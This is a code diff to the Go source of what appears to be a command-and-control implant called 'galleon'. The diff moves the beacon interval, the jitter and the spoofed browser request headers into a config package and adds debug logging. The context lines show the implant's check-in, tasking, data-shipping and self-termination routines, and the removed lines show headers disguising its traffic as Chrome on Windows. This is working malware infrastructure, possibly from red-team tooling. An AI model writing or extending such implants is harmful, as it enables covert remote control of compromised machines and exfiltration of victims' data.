@@ -16,6 +16,8 @@ import (
 
 	"bytes"
 	"encoding/json"
+	"galleon/agent_config"
+	"galleon/debug"
 )
 
 var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano()))
@@ -65,8 +67,8 @@ func GatherInfo() InitialInfo {
 		Session:       hexString,
 		Hostname:      hostname,
 		Username:      currentUser.Username,
-		Callback_freq: 1,
-		Jitter:        15,
+		Callback_freq: agent_config.CallbackVal,
+		Jitter:        agent_config.JitterVal,
 	}
 	return hostInfo
 }
@@ -77,6 +79,9 @@ func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
 			TerminateImplant()
 		}
 		resp, err := PostJson(serverUrl+"/implants/", initialInfo)
+		if debug.Debug {
+			fmt.Printf("[*] Firing initial checkin to: %s\n", serverUrl+"/implants/")
+		}
 		if err != nil || resp != 200 {
 
 			time.Sleep(60 * time.Second)
@@ -104,6 +109,9 @@ func CheckIn(serverAddr string, session string) (int, error) {
 	}
 
 	resp, err := client.Get(url)
+	if debug.Debug {
+		fmt.Printf("[*] Firing health checkin to: %s\n", serverAddr+"/health/"+session)
+	}
 	if err != nil {
 		return 0, nil
 	}
@@ -115,6 +123,9 @@ func FetchTasking(serverAddr string, session string) (string, error) {
 	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
 
 	resp, err := CustomClient.Get(url)
+	if debug.Debug {
+		fmt.Printf("[*] Fetching tasking: %s\n", serverAddr+"/tasks/"+session)
+	}
 	if err != nil {
 		return "", err
 	}
@@ -136,6 +147,9 @@ func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
 	totalSeconds := baseSeconds + jitterSeconds
 
 	jitterDuration := time.Duration(totalSeconds) * time.Second
+	if debug.Debug {
+		fmt.Printf("[*] Jitter: %d\n", int(jitterDuration.Seconds())-60)
+	}
 	return jitterDuration
 }
 
@@ -148,14 +162,10 @@ func PostJson(url string, payload interface{}) (int, error) {
 	if err != nil {
 		return 0, err
 	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("SEC-CH-UA-PLATFORM", "Windows")
-	req.Header.Set("SEC-CH-UA-PLATFORM-VERSION", "3.0.0")
-	req.Header.Set("SEC-FETCH-SITE", "cross-site")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36")
 
+	for key, value := range agent_config.ReqHeaders {
+		req.Header.Set(key, value)
+	}
 	resp, err := CustomClient.Do(req)
 
 	if err != nil {
@@ -184,6 +194,9 @@ func DataShipper(serverUrl string, taskData map[string]interface{}, results stri
 }
 
 func TerminateImplant() {
+	if debug.Debug {
+		fmt.Println("[!] TerminateImplant() fired")
+	}
 	exePath, err := os.Executable()
 	if err != nil {
 		os.Exit(3)
